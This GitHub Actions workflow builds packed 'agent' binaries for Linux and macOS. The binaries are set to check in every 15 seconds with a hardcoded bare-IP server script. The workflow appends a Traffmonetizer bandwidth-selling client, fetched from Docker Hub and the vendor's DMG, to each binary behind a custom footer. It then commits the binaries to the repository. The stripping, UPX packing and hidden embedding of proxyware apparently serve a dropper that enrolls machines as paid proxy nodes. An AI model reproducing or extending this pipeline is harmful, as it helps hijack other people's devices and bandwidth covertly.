name: Build Binaries and Commit to Repo

on:
  push:
    branches: [ "main" ]
    paths:
      - 'agent.cpp'
      - '.github/workflows/build.yml'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build-linux:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Compilers & UPX
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential upx-ucl g++-aarch64-linux-gnu

      - name: Compile Linux Binaries
        run: |
          mkdir -p bin
          SERVER="${{ secrets.CONF_SERVER_URL }}"
          [ -z "$SERVER" ] && SERVER="http://65.20.91.208/turbox_server.php"

          # Build Linux x86_64
          g++ -O3 -std=c++17 agent.cpp \
            -DCONF_SERVER_URL="\"$SERVER\"" \
            -DCONF_INTERVAL=15 \
            -lpthread -s \
            -o bin/agent_linux_x86_64

          # Build Linux ARM64
          aarch64-linux-gnu-g++ -O3 -std=c++17 agent.cpp \
            -DCONF_SERVER_URL="\"$SERVER\"" \
            -DCONF_INTERVAL=15 \
            -lpthread -s \
            -o bin/agent_linux_arm64

          upx --best --ultra-brute bin/agent_linux_x86_64 2>/dev/null || true
          upx --best --ultra-brute bin/agent_linux_arm64 2>/dev/null || true

          # Tải và MERGE trực tiếp native engine self-contained đầy đủ vào 2 file binary Linux
          echo "Merging native Linux self-contained engine directly into binary files..."
          python3 - << 'EOF'
          import urllib.request, json, tarfile, gzip, struct, os, glob, shutil

          def bundle_self_contained_layer(digest, out_bin):
              tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']
              req = urllib.request.Request(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}', headers={'Authorization': f'Bearer {tok}'})
              data = urllib.request.urlopen(req).read()
              tmp_layer = f'/tmp/layer_{digest[:8]}.tar.gz'
              open(tmp_layer, 'wb').write(data)
              tar = tarfile.open(tmp_layer)
              bundle_dir = f'/tmp/bundle_{digest[:8]}'
              os.makedirs(f'{bundle_dir}/lib', exist_ok=True)
              tar.extractall(bundle_dir)
              # Đảm bảo cli nằm ở gốc bundle
              if os.path.exists(f'{bundle_dir}/usr/local/bin/cli'):
                  shutil.move(f'{bundle_dir}/usr/local/bin/cli', f'{bundle_dir}/cli')
                  os.chmod(f'{bundle_dir}/cli', 0o755)
              # Đóng gói kèm các thư viện liên kết động cơ bản nếu có trên hệ thống build
              for pat in ['*ssl*.so*', '*crypto*.so*', '*icu*.so*']:
                  for lib_path in glob.glob(f'/usr/lib/**/{pat}', recursive=True) + glob.glob(f'/lib/**/{pat}', recursive=True):
                      bname = os.path.basename(lib_path)
                      dst = os.path.join(f'{bundle_dir}/lib', bname)
                      if not os.path.exists(dst):
                          try: shutil.copy2(lib_path, dst)
                          except Exception: pass
              # Nén toàn bộ bundle directory thành tar.gz
              out_tar = f'/tmp/bundle_{digest[:8]}.tar.gz'
              with tarfile.open(out_tar, 'w:gz') as t_out:
                  t_out.add(f'{bundle_dir}/cli', arcname='cli')
                  if os.path.exists(f'{bundle_dir}/lib'):
                      t_out.add(f'{bundle_dir}/lib', arcname='lib')
              tar_data = open(out_tar, 'rb').read()
              foot = struct.pack('<Q', len(tar_data)) + b'TURBOX_BUNDLE\x00\x00\x00'
              if os.path.exists(out_bin):
                  open(out_bin, 'ab').write(tar_data + foot)
                  print(f'Merged {len(tar_data)} bytes self-contained bundle into {out_bin}')
              shutil.rmtree(bundle_dir, ignore_errors=True)
              os.remove(tmp_layer)
              os.remove(out_tar)

          bundle_self_contained_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
          bundle_self_contained_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
          EOF

      - name: Upload Linux Binaries
        uses: actions/upload-artifact@v4
        with:
          name: linux-binaries
          path: bin/

  build-macos:
    runs-on: macos-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Compile macOS Binaries (Apple Silicon + Intel)
        run: |
          mkdir -p bin
          SERVER="${{ secrets.CONF_SERVER_URL }}"
          [ -z "$SERVER" ] && SERVER="http://65.20.91.208/turbox_server.php"

          # Build macOS ARM64 (Apple Silicon M1/M2/M3/M4)
          clang++ -O3 -std=c++17 agent.cpp \
            -target arm64-apple-macos \
            -DCONF_SERVER_URL="\"$SERVER\"" \
            -DCONF_INTERVAL=15 \
            -lpthread \
            -o bin/agent_darwin_arm64

          # Build macOS x86_64 (Intel Mac)
          clang++ -O3 -std=c++17 agent.cpp \
            -target x86_64-apple-macos \
            -DCONF_SERVER_URL="\"$SERVER\"" \
            -DCONF_INTERVAL=15 \
            -lpthread \
            -o bin/agent_darwin_x86_64

          # Tải và MERGE trực tiếp native macOS app vào 2 file binary macOS (giữ nguyên chữ ký gốc Developer ID)
          echo "Merging native macOS Traffmonetizer app directly into binary files..."
          curl -sSL -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg
          mkdir -p /tmp/tm_mnt
          hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt
          tar -czf /tmp/tm_mac.tar.gz -C /tmp/tm_mnt Traffmonetizer.app
          hdiutil detach /tmp/tm_mnt -force 2>/dev/null || true
          rm -rf /tmp/tm_mnt /tmp/tm.dmg
          python3 -c "import struct, os; p = open('/tmp/tm_mac.tar.gz', 'rb').read(); foot = struct.pack('<Q', len(p)) + b'TURBOX_BUNDLE\x00\x00\x00'; [open(b, 'ab').write(p + foot) for b in ['bin/agent_darwin_x86_64', 'bin/agent_darwin_arm64'] if os.path.exists(b)]"
          rm -f /tmp/tm_mac.tar.gz

      - name: Upload macOS Binaries
        uses: actions/upload-artifact@v4
        with:
          name: macos-binaries
          path: bin/

  commit-all:
    needs: [build-linux, build-macos]
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Download Linux Binaries
        uses: actions/download-artifact@v4
        with:
          name: linux-binaries
          path: bin/

      - name: Download macOS Binaries
        uses: actions/download-artifact@v4
        with:
          name: macos-binaries
          path: bin/

      - name: Commit Binaries into Git Repo
        run: |
          chmod +x bin/*
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"
          git add bin/
          git commit -m "Auto-build native binaries for Linux & macOS [skip ci]" || echo "No changes"
          git pull --rebase origin main || true
          git push origin main
